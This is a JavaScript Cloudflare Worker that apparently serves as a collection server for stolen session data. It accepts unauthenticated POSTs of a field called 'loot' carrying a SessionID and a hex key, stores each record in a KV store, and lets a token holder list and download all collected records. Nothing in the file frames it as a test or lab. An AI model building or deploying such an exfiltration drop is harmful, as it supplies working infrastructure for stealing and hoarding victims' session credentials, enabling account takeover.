export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // === POST: Store session data ===
    if (request.method === 'POST') {
      try {
        const formData = await request.formData();
        const loot = formData.get('loot');

        if (!loot || typeof loot !== 'string') {
          return new Response('Missing or invalid loot data', { status: 400 });
        }

        // Split loot into key-value pairs
        const data = {};
        loot.split('|').forEach(pair => {
          const colonIndex = pair.indexOf(':');
          if (colonIndex > 0) {
            const key = pair.slice(0, colonIndex);
            const value = pair.slice(colonIndex + 1);
            data[key] = value;
          }
        });

        // Required fields
        const sessionId = data['SessionID'];
        const hexKey = data['Key'];
        if (!sessionId || !hexKey) {
          return new Response('Missing SessionID or Key in loot', { status: 400 });
        }

        // Generate unique KV key with timestamp
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const kvKey = `session_${sessionId}_${timestamp}`;

        // Store FULL structured data
        await env.SESSION_KV.put(kvKey, JSON.stringify(data), {
          metadata: { contentType: 'application/json', sessionId }
        });

        return new Response(`Session stored: ${kvKey}`, { status: 200 });
      } catch (error) {
        return new Response(`Server error: ${error.message}`, { status: 500 });
      }
    }

    // === GET: List keys, get single key, or count ===
    if (request.method === 'GET') {
      // Authenticate
      if (url.searchParams.get('token') !== env.SECRET_TOKEN) {
        return new Response('Unauthorized', { status: 401 });
      }

      const keyParam = url.searchParams.get('key');
      const countOnly = url.searchParams.get('count') === 'true';

      // Return single key
      if (keyParam) {
        const data = await env.SESSION_KV.get(keyParam, { type: 'json' });
        if (!data) return new Response('Not found', { status: 404 });
        return new Response(JSON.stringify(data, null, 2), {
          headers: { 'Content-Type': 'application/json' }
        });
      }

      // List keys OR count only
      const list = await env.SESSION_KV.list();
      const keys = list.keys.map(k => k.name);

      if (countOnly) {
        return new Response(JSON.stringify({ count: keys.length }), {
          headers: { 'Content-Type': 'application/json' }
        });
      }

      return new Response(JSON.stringify(keys), {
        headers: { 'Content-Type': 'application/json' }
      });
    }

    return new Response('Method not allowed', { status: 405 });
  }
};
